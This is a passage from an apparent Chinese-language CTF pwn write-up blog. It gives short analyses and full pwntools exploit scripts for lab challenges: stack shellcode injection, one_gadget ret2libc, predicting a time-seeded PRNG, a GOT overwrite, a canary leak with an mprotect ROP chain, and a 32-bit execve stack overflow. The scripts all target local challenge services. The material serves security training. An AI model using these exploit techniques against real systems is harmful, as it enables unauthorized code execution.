class="hljs-comment">#p=process(&#x27;./leak_sth&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">38901</span>)<br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>dll=cdll.<span class="hljs-title class_">LoadLibrary</span>(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>seed =time.time()<br>a=int(seed)<br>dll.srand(a)<br><br>ru(<span class="hljs-string">&#x27;name&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;xyyr&#x27;</span>)<br>sl(str(dll.rand()))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="5-ez-shellcode"><a href="#5-ez-shellcode" class="headerlink" title="5 ez_shellcode"></a>5 ez_shellcode</h4><p>给出栈的地址，并且开了可执行权限，在栈上写入shellcode再跳转回来即可</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181613307.png" srcset="/img/loading.gif" lazyload alt="image-20240918161337231"></p>
+<p>exp:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">45179</span>)<br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>ru(<span class="hljs-string">&#x27;age&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;-1&#x27;</span>)<br>rl()<br>rl()<br>stack_addr = int(rl(),<span class="hljs-number">16</span>)<br>print(hex(stack_addr))<br>shellcode = asm(shellcraft.sh())<br>payload = shellcode.ljust(<span class="hljs-number">0x68</span>,b<span class="hljs-string">&quot;A&quot;</span>)+p64(stack_addr)<br>sd(payload)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="6-这是什么？libc"><a href="#6-这是什么？libc" class="headerlink" title="6 这是什么？libc"></a>6 这是什么？libc</h4><p>给出libc地址，直接全用libc打栈溢出即可。本来想常规system，但是懒得再指令找寄存器，突然想起还有onegadget，直接梭（没想到第一个就出来了）</p>
+<p>（这里又练习了一下用正则表达式匹配，不知道为什么顺序必须是先0-9再a-f才能正常匹配）</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181645088.png" srcset="/img/loading.gif" lazyload alt="image-20240918164515012"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> re<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">36525</span>)<br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>strs=p.recv()<br><br>puts_addr = re.findall(<span class="hljs-string">r&#x27;0x[0-9a-f]+&#x27;</span>,strs.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>puts_addr = <span class="hljs-string">&#x27;&#x27;</span>.join(puts_addr)<br>puts_addr = <span class="hljs-built_in">int</span>(puts_addr,<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>onegad = [<span class="hljs-number">0x50a47</span>,<span class="hljs-number">0xebc81</span>,<span class="hljs-number">0xebc85</span>,<span class="hljs-number">0xebc88</span>,<span class="hljs-number">0xebce2</span>,<span class="hljs-number">0xebd3f</span>,<span class="hljs-number">0xebd43</span>]<br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">9</span> + p64(libc_base+onegad[<span class="hljs-number">0</span>])<br>sd(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="7-这是什么？shellcode"><a href="#7-这是什么？shellcode" class="headerlink" title="7 这是什么？shellcode"></a>7 这是什么？shellcode</h4><p>懒得自己写shellcode，还是用了shellcraft.sh(),这里原本有个call buf，但是会导致反汇编为伪代码失败，先直接nop掉了</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181657463.png" srcset="/img/loading.gif" lazyload alt="image-20240918165719400"></p>
+<p>exp就是直接输入生成shell.没有加过滤来强迫自己写shellcode（那就懒得自己写喽，嘿嘿）</p>
+<h4 id="8-这是什么？random"><a href="#8-这是什么？random" class="headerlink" title="8 这是什么？random"></a>8 这是什么？random</h4><p>只需要答对利用时间戳的10次伪随机即可</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181739628.png" srcset="/img/loading.gif" lazyload alt="image-20240918173904515"></p>
+<p>中间出了问题，动调进去看，localtime的参数是这个时间戳</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181739111.png" srcset="/img/loading.gif" lazyload alt="image-20240918173924085"></p>
+<p>转化后就是对应的今天</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181739235.png" srcset="/img/loading.gif" lazyload alt="image-20240918173958193"></p>
+<p>但是srandom的参数是0x105&#x3D;261</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181740053.png" srcset="/img/loading.gif" lazyload alt="image-20240918174029029"></p>
+<p>但是我这里多了一天？？</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181741287.png" srcset="/img/loading.gif" lazyload alt="image-20240918174123224"></p>
+<p>把这儿的减了1就行了，但是不知道为什么会导致二者不一致，明明time.time()生成出来的一样。</p>
+<p>查的一点点只是秒的差距，按理说没影响。转化出来的16进制数为0x66EAA093</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181743522.png" srcset="/img/loading.gif" lazyload alt="image-20240918174354471"></p>
+<p>经过各种查询，我写这个的时候的当天就是262！！！！</p>
+<p>呜呜呜，不懂，坐等大佬教。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./prerandom&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;127.0.0.1&#x27;,35857)</span><br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>dll=cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>gdb.attach(p,<span class="hljs-string">&#x27;main&#x27;</span>)<br><br>timer = time.time()<span class="hljs-comment">#==time(0)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(timer))<br>v3 = time.localtime(<span class="hljs-built_in">int</span>(timer))<br><span class="hljs-built_in">print</span>(v3)<br>seed = v3.tm_yday-<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(seed)<br><br><br>dll.srand(seed)<br><span class="hljs-comment">#debug()</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>):<br>    sl(<span class="hljs-built_in">str</span>(dll.rand() % <span class="hljs-number">90000</span>+<span class="hljs-number">10000</span>))<span class="hljs-comment">#the first is 70083 by debug because of seed is day.</span><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="9-flag-helper"><a href="#9-flag-helper" class="headerlink" title="9 flag_helper"></a>9 flag_helper</h4><p>本来随便试了试，试不出来，发现可以把提示开了，根据提示磨出来了。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409182226330.png" srcset="/img/loading.gif" lazyload alt="image-20240918222641263"></p>
+<p>首先是4个选项</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409182229029.png" srcset="/img/loading.gif" lazyload alt="image-20240918222952007"></p>
+<ul>
+<li><p>一个个试了，1选了又回来了，重复这个循环；2退出；3会卡死；只有4有一些交互</p>
+</li>
+<li><p>选择4后让说路径，尝试了&#x2F;，&#x2F;root，&#x2F;ctf,&#x2F;pwn，最后看了提示才知道&#x2F;flag</p>
+</li>
+<li><p>然后让给出flags来打开，已知0、1、2有特殊含义，3试了之后被拒绝，然后用4，发现输出了一系列打开</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409182233403.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ul>
+<p>这里flag文件时第3个，文件描述符为5（后面会用到）</p>
+<ul>
+<li><p>prot权限选择<br><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409182234200.png" srcset="/img/loading.gif" lazyload alt="image-20240918223413167"></p>
+<p>1：可读，2：可写，4：可执行。本来想着可读就行，最后不行，所以干脆给了7（可读可写可执行）</p>
+<p>不过据说如果open没有那么高的权限的话，mmap如果赋予更高会出错。（不过这里可以）</p>
+</li>
+<li><p>然后问flags，下面是一些参数，由于提示mmap传入的fd是-1，所以要用匿名映射，由于匿名映射不能访问文件，还有创建私有映射，所以填了33（34也可以）（按理说这么分析，但是我是爆破出来的，当时脑子有点不在线）</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409182234976.png" srcset="/img/loading.gif" lazyload alt="image-20240918223435924"></p>
+</li>
+<li><p>最后问文件的fd值，显然是5。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409182240807.png" srcset="/img/loading.gif" lazyload alt="image-20240918223757935"></p>
+</li>
+</ul>
+<p>exp：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./&#x27;)</span><br><span class="hljs-comment">#p=remote(&#x27;127.0.0.1&#x27;,35921)</span><br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">for i in range (40):</span><br><span class="hljs-string">    p=remote(&#x27;</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-string">&#x27;,38747)</span><br><span class="hljs-string">    sl(b&#x27;</span><span class="hljs-number">4</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">    rl()</span><br><span class="hljs-string">    sl(&#x27;</span>/flag<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">    rl()</span><br><span class="hljs-string">    rl()</span><br><span class="hljs-string">    sl(b&#x27;</span><span class="hljs-number">4</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">    rl()</span><br><span class="hljs-string">    sl(b&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">    rl()</span><br><span class="hljs-string">    sl(str(f&#x27;</span>&#123;i&#125;<span class="hljs-string">&#x27;))</span><br><span class="hljs-string">    p.interactive()</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">45215</span>)<br>sl(b<span class="hljs-string">&#x27;4&#x27;</span>)<br>rl()    <br>sl(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>rl()<br>rl()<br>sl(b<span class="hljs-string">&#x27;4&#x27;</span>)<br>rl()<br>sl(b<span class="hljs-string">&#x27;7&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;flags&#x27;</span>)<br>sl(b<span class="hljs-string">&#x27;33&#x27;</span>)<br>rl()<br>sl(b<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="10-这是什么？got"><a href="#10-这是什么？got" class="headerlink" title="10 这是什么？got"></a>10 这是什么？got</h4><p>直接允许往got表里填东西，从前往后填，把exit的got跳转到后门函数，但是会把system的got表里填的东西破坏，本来想着绕过，结果read没啥可绕的，那就看看在绑定前是什么。</p>
+<p>好，plt+6的固定地址，保护好system的got表即可</p>
+<p><img src="C:/Users/czy/AppData/Roaming/Typora/typora-user-images/image-20240919215159756.png" srcset="/img/loading.gif" lazyload alt="image-20240919215159756"></p>
+<p>exp：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./pregot&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;127.0.0.1&#x27;,37689)</span><br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br>back_addr = <span class="hljs-number">0x401196</span><br>main_addr = <span class="hljs-number">0x401217</span><br>system_plt_6 = <span class="hljs-number">0x401056</span><br>payload = p64(system_plt_6)*<span class="hljs-number">7</span> + p64(back_addr)<br>debug()<br>sd(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="11-nx-on"><a href="#11-nx-on" class="headerlink" title="11 nx-on"></a>11 nx-on</h4><p>静态编译，有mportect，mprotect开权限后打shellcode就行。</p>
+<p>有cananry，把canary绕过后，栈溢出mprotect开权限，然后打shellcode</p>
+<p>本来想用用ropchain，结果太长了，不给偷懒的机会。。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409192208848.png" srcset="/img/loading.gif" lazyload alt="image-20240919220816806"></p>
+<p>unsigned int 可以有整数溢出，不过-1太大了，后面复制会崩。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409192207952.png" srcset="/img/loading.gif" lazyload alt="image-20240919220646278"></p>
+<p>注意别忘了mprotrct调用，别忘了要整数页对齐。三参分别为地址、长度、权限。</p>
+<p>exp:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./nx_on&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">34105</span>)<br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>mprotect_addr = <span class="hljs-number">0x450B90</span><br>pop_rdi = <span class="hljs-number">0x000000000040239f</span><br>pop_rsi = <span class="hljs-number">0x000000000040a40e</span><br>pop_rdx_rbx = <span class="hljs-number">0x000000000049d12b</span><br>bss_addr = <span class="hljs-number">0x4E5B60</span><br><br>ru(<span class="hljs-string">&#x27;id&#x27;</span>)<br>sd(b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+b<span class="hljs-string">&#x27;b&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;ab&#x27;</span>)<br>canary = b<span class="hljs-string">&#x27;\x00&#x27;</span><br>canary += p.recv(<span class="hljs-number">7</span>)<br>canary = u64(canary)<br>print(hex(canary))<br>payload = b<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x18</span> + p64(canary) * <span class="hljs-number">2</span> + p64(pop_rdi) + p64(<span class="hljs-number">0x4e5000</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0x2000</span>) + p64(pop_rdx_rbx) + p64(<span class="hljs-number">7</span>) * <span class="hljs-number">2</span> + p64(mprotect_addr) + p64(bss_addr + <span class="hljs-number">0x18</span> + <span class="hljs-number">0x8</span> * <span class="hljs-number">11</span>) + asm(shellcraft.sh()) <br>sd(payload)<br>ru(<span class="hljs-string">&#x27;size&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>sl(b<span class="hljs-string">&#x27;-1111&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="12-这是什么，32-bit？"><a href="#12-这是什么，32-bit？" class="headerlink" title="12 这是什么，32-bit？"></a>12 这是什么，32-bit？</h4><p>scanf看着怪怪的，其实就以回车截止，没啥用。</p>
+<p>gituid，当root权限时，返回0；普通用户为1，改不了，直接栈溢出去跳backdoor</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409201039522.png" srcset="/img/loading.gif" lazyload alt="image-20240920103914363"></p>
+<p>backdoor这里改一改函数的参数<br><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409201042234.png" srcset="/img/loading.gif" lazyload alt="image-20240920104233186"></p>
+<p>execve(‘&#x2F;bin&#x2F;sh’,0,0)，注意bin_sh的传参时只想bin_sh字符串的地址，不能是间接的。</p>
+<p>本来想试试直接用execve来cat flag，结果没有能对应的字符串，连fake_flag也读不出来。。。我就要看看fake</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409201119431.png" srcset="/img/loading.gif" lazyload alt="image-20240920111929396"></p>
+<p>exp：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./backdoor&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">45815</span>)<br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>backdoor_addr = <span class="hljs-number">0x80491D6</span><br>execve_addr = <span class="hljs-number">0x8049212</span><br>bin_sh  = <span class="hljs-number">0x804A011</span><br><span class="hljs-comment">#bin_sh = 0x804C030</span><br>bin_cat = <span class="hljs-number">0x804A008</span><br>flag_str = <span class="hljs-number">0x804A021</span><br>sd(b<span class="hljs-string">&#x27;\n&#x27;</span>)<br>payload = b<span class="hljs-string">&quot;A&quot;</span> * (<span class="hljs-number">0x28</span> + <span class="hljs-number">4</span>) + p32(execve_addr) + p32(bin_sh) + p32(<span class="hljs-number">0</span>) +p32(<span class="hljs-number">0</span>) <br><span class="hljs-comment">#payload = b&quot;A&quot;*(0x28+4) + p32(execve_addr) + p32(bin_cat) + p32(flag_str) + p32(0)</span><br><span class="hljs-comment">#debug()</span><br>sl(payload)<br><br><br>p.interactive()<br>           <br></code></pre></td></tr></table></figure>
+
+<h4 id="13-moeplane"><a href="#13-moeplane" class="headerlink" title="13 moeplane"></a>13 moeplane</h4><p>给了个关于航班的结构体，提示负数溢出，试了好久，没头绪，不会</p>
+<h4 id="14-Loginsystem"><a href="#14-Loginsystem" class="headerlink" title="14 Loginsystem"></a>14 Loginsystem</h4><p>主函数格式化字符串打印泄露bss段上存的password即可。（不过不知道为什么给了so文件，哦，不同系统对应的偏移可能不同。懒得换了，大不了一点点往下测，不过恰好与本机一样了）</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409201720224.png" srcset="/img/loading.gif" lazyload alt="image-20240920172054140"></p>
+<p>password是个获取的随机数</p>
